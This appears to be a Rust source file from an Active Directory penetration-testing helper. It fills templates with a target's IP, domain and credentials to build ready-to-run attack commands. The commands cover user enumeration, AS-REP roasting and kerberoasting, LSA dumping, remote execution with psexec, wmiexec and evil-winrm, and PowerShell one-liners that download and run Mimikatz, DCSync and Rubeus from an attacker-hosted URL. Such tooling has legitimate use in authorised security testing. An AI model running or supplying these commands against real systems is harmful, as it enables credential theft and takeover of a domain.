//! Komut şablonları ve kategoriler.
//! Placeholder'lar: {USER} {PASS} {DOMAIN} {IP} {NQIP} {NQUSER} {NQDOMAIN} {LDAP} {USERLIST} {USERLIST_XATO} {LOCAL_URL}

#[derive(Clone)]
pub struct CommandItem {
    pub comment: String,
    pub command: String,
}

#[derive(Clone)]
pub struct CommandCategory {
    pub name: String,
    pub items: Vec<CommandItem>,
}

/// Tüm placeholder'ları bağlam ile değiştirir.
pub fn substitute(ctx: &CommandContext, s: &str) -> String {
    let mut out = s.to_string();
    out = out.replace("{USER}", &ctx.username);
    out = out.replace("{PASS}", &ctx.password);
    out = out.replace("{DOMAIN}", &ctx.domain);
    out = out.replace("{IP}", &ctx.ip);
    out = out.replace("{NQIP}", &ctx.ip_plain);
    out = out.replace("{NQUSER}", &ctx.username_plain);
    out = out.replace("{NQDOMAIN}", &ctx.domain_plain);
    out = out.replace("{LDAP}", &ctx.ldap_base);
    out = out.replace("{USERLIST}", &ctx.userlist);
    out = out.replace("{USERLIST_XATO}", &ctx.userlist_xato);
    out = out.replace("{LOCAL_URL}", &ctx.local_url);
    out
}

#[derive(Default, Clone)]
pub struct CommandContext {
    pub username: String,
    pub password: String,
    pub domain: String,
    pub ip: String,
    pub ip_plain: String,
    pub username_plain: String,
    pub domain_plain: String,
    pub ldap_base: String,
    pub userlist: String,
    pub userlist_xato: String,
    pub local_url: String,
    pub local_ip: String,
    pub local_port: String,
}

impl CommandContext {
    pub fn build(mut self, ip: &str, domain: &str, username: &str, password: &str) -> Self {
        self.ip_plain = ip.to_string();
        self.ip = if ip.is_empty() { String::new() } else { format!("'{}'", ip) };
        self.domain_plain = domain.to_string();
        self.domain = if domain.is_empty() { String::new() } else { format!("'{}'", domain) };
        self.username_plain = username.to_string();
        self.username = if username.is_empty() { String::new() } else { format!("'{}'", username) };
        self.password = password.to_string();
        if !self.local_ip.is_empty() && !self.local_port.is_empty() {
            self.local_url = format!("http://{}:{}/", self.local_ip, self.local_port);
        }
        self
    }
}

fn cat(name: &str, items: Vec<(&str, &str)>) -> CommandCategory {
    CommandCategory {
        name: name.to_string(),
        items: items
            .into_iter()
            .map(|(comment, command)| CommandItem {
                comment: comment.to_string(),
                command: command.to_string(),
            })
            .collect(),
    }
}

/// Null mod: kimlik bilgisi olmadan Ã§alÄ±ÅŸtÄ±rÄ±lacak komutlar
pub fn null_mode_categories() -> Vec<CommandCategory> {
    vec![
        cat("crackmapexec", vec![
            ("RID brute", "crackmapexec smb {IP} -u '' -p '' -d {DOMAIN} --rid-brute"),
            ("Guest", "crackmapexec smb {IP} -u 'guest' -p '' -d {DOMAIN} --rid-brute"),
        ]),
        cat("enum4linux", vec![
            ("Null", "enum4linux -u '' -p '' -r {NQIP} -w {DOMAIN} | grep 'Local User'"),
            ("Guest", "enum4linux -u 'guest' -p '' -r {NQIP} -w {DOMAIN} | grep 'Local User'"),
        ]),
        cat("Nmap SMB", vec![
            ("SMB users", "nmap --script=smb-enum-users -p 445 {NQIP}"),
        ]),
        cat("SMBclient", vec![
            ("Null", "smbclient -U '' -N -L \\\\\\\\{NQIP} -W {DOMAIN}"),
        ]),
        cat("SMBmap", vec![
            ("", "smbmap -H {NQIP} -u '' -p '' -d {DOMAIN}"),
        ]),
        cat("Kerberos", vec![
            ("kerbrute", "kerbrute userenum {USERLIST} --dc {NQIP} --domain {DOMAIN}"),
            ("kerbrute xato", "kerbrute userenum {USERLIST_XATO} --dc {NQIP} --domain {DOMAIN}"),
            ("nmap krb5", "nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm={DOMAIN},userdb={USERLIST} {NQIP}"),
        ]),
        cat("LDAP", vec![
            ("", "nmap -Pn -n -sV --script \"ldap* and not brute\" {NQIP}"),
        ]),
    ]
}

/// DÄ±ÅŸ komutlar (hedefe dÄ±ÅŸarÄ±dan)
pub fn external_categories() -> Vec<CommandCategory> {
    vec![
        cat("Nmap", vec![
            ("Top 50", "nmap -Pn -sV --top-ports 50 --open {NQIP}"),
            ("Top 100", "nmap -Pn -sV --top-ports 100 --open {NQIP}"),
            ("Full + scripts", "nmap -Pn -p- -sS -sV -sC -v {NQIP}"),
            ("SMB vuln", "nmap -Pn --script smb-vuln* -p 139,445 -v {NQIP}"),
        ]),
        cat("DNS", vec![
            ("dns-brute", "nmap -Pn --script dns-brute --script-args dns-brute.threads=12 {DOMAIN} {NQIP}"),
            ("dig AXFR", "dig AXFR {DOMAIN} @{NQIP}"),
            ("dig NS", "dig @{NQIP} {DOMAIN} NS"),
            ("dnsenum", "dnsenum --dnsserver {NQIP} --enum {DOMAIN}"),
        ]),
        cat("Kerberos", vec![
            ("GetNPUsers (hashcat)", "GetNPUsers.py {DOMAIN}/ -usersfile {USERLIST} -dc-ip {NQIP} -format 'hashcat'"),
            ("GetNPUsers (user:pass)", "GetNPUsers.py {NQDOMAIN}/{NQUSER}:{PASS} -request -dc-ip {NQIP} -format 'hashcat'"),
            ("kerbrute", "kerbrute userenum {USERLIST} --dc {NQIP} --domain {DOMAIN}"),
        ]),
        cat("SMB", vec![
            ("enum", "nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -Pn -p 139,445 {NQIP}"),
            ("smbmap", "smbmap -H {NQIP} -u {USER} -p {PASS} -d {DOMAIN}"),
            ("smbmap recursive", "smbmap -H {NQIP} -u {USER} -p {PASS} -d {DOMAIN} -R"),
            ("crackmapexec shares", "crackmapexec smb {NQIP} -u {USER} -p {PASS} -d {DOMAIN} --shares"),
            ("crackmapexec users", "crackmapexec smb {NQIP} -u {USER} -p {PASS} -d {DOMAIN} --users"),
            ("crackmapexec pass-pol", "crackmapexec smb {NQIP} -u {USER} -p {PASS} -d {DOMAIN} --pass-pol"),
            ("crackmapexec LSA", "crackmapexec smb {NQIP} -u {USER} -p {PASS} -d {DOMAIN} --lsa"),
            ("crackmapexec exec", "crackmapexec smb {NQIP} -u {USER} -p {PASS} -d {DOMAIN} -x whoami"),
        ]),
        cat("LDAP", vec![
            ("crackmapexec users", "crackmapexec ldap {NQIP} -u {USER} -p {PASS} --kdcHost {DOMAIN} --users"),
            ("crackmapexec kerberoast", "crackmapexec ldap {NQIP} -u {USER} -p {PASS} --kdcHost {DOMAIN} --kerberoasting KERBEROASTING"),
            ("crackmapexec asreproast", "crackmapexec ldap {NQIP} -u {USER} -p {PASS} --kdcHost {DOMAIN} --asreproast ASREPROAST"),
            ("ldapsearch", "ldapsearch -x -H ldap://{NQIP} -D '{NQDOMAIN}\\\\{NQUSER}' -w {PASS} -b \"{LDAP}\""),
            ("ldapdomaindump", "ldapdomaindump -u {NQDOMAIN}\\\\{NQUSER} -p {PASS} ldap://{NQIP}"),
        ]),
        cat("WinRM", vec![
            ("crackmapexec", "crackmapexec winrm {NQIP} -u {USER} -p {PASS}"),
            ("evil-winrm", "evil-winrm -i {NQIP} -u {USER} -p {PASS}"),
        ]),
        cat("Impacket", vec![
            ("GetADUsers", "GetADUsers.py {NQDOMAIN}/{NQUSER}:{PASS} -dc-ip {NQIP}"),
            ("GetUserSPNs", "GetUserSPNs.py {NQDOMAIN}/{NQUSER}:{PASS} -dc-ip {NQIP} -request"),
            ("lookupsid", "lookupsid.py {NQDOMAIN}/{NQUSER}:{PASS}@{NQIP}"),
            ("psexec", "psexec.py {NQDOMAIN}/{NQUSER}:{PASS}@{NQIP}"),
            ("wmiexec", "wmiexec.py {NQDOMAIN}/{NQUSER}:{PASS}@{NQIP}"),
        ]),
        cat("RDP", vec![
            ("xfreerdp", "xfreerdp /v:{NQIP} /u:{USER} /p:{PASS} /d:{DOMAIN}"),
            ("+clipboard", "xfreerdp /v:{NQIP} /u:{USER} /p:{PASS} /d:{DOMAIN} +clipboard"),
        ]),
        cat("BloodHound", vec![
            ("", "bloodhound-python -u {USER} -p {PASS} -ns {NQIP} -d {DOMAIN} -c All,LoggedOn"),
        ]),
    ]
}

/// Ä°Ã§ komutlar (DC Ã¼zerinde Ã§alÄ±ÅŸtÄ±rÄ±lacak PowerShell vb.)
pub fn internal_categories() -> Vec<CommandCategory> {
    vec![
        cat("Credential Dumping", vec![
            ("Mimikatz (LSASS)", "iex (iwr -usebasicparsing {LOCAL_URL}Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"),
            ("Get-PassHashes (SAM)", "iex (iwr -usebasicparsing {LOCAL_URL}Get-PassHashes.ps1);Get-PassHashes"),
            ("DCSync", "iex (iwr -usebasicparsing {LOCAL_URL}Invoke-DCSync.ps1);Invoke-DCSync"),
        ]),
        cat("Privesc", vec![
            ("WinPEAS", "iex (iwr -usebasicparsing {LOCAL_URL}Invoke-winPEAS.ps1);Invoke-WinPEAS"),
            ("PowerUp", "iex (iwr -usebasicparsing {LOCAL_URL}PowerUp.ps1);Invoke-AllChecks"),
            ("Get-GPPPassword", "iex (iwr -usebasicparsing {LOCAL_URL}Get-GPPPassword.ps1);Get-GPPPassword"),
            ("Sherlock", "iex (iwr -usebasicparsing {LOCAL_URL}Sherlock.ps1);Find-AllVulns"),
        ]),
        cat("Enumeration", vec![
            ("HostRecon", "iex (iwr -usebasicparsing {LOCAL_URL}HostRecon.ps1);Invoke-HostRecon"),
            ("Seatbelt", "iex (iwr -usebasicparsing {LOCAL_URL}Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"),
            ("BloodHound SharpHound", "iex (iwr -usebasicparsing {LOCAL_URL}SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"),
        ]),
        cat("Kerberos (internal)", vec![
            ("AS-REP Rubeus", "iex (iwr -usebasicparsing {LOCAL_URL}Invoke-Rubeus.ps1);Invoke-Rubeus -Command \"asreproast /nowrap\""),
            ("Kerberoast", "iex (iwr -usebasicparsing {LOCAL_URL}Invoke-Rubeus.ps1);Invoke-Rubeus -Command \"kerberoast /nowrap\""),
        ]),
    ]
}
